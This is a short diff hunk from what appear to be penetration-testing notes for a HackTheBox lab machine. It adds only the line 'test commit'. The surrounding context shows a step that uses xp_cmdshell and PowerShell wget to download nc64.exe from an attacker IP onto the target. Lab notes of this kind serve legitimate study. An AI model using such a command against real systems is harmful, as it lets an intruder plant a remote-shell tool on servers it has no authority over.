@@ -26,3 +26,4 @@ dc01.darkzero.htb.	3600	IN	A	172.16.20.1
 5. upload nc64.exe to target
 - xp_cmdshell powershell wget -UseBasicParsing http://10.10.14.223/nc64.exe -OutFile nc64.exe
 
+6. test commit
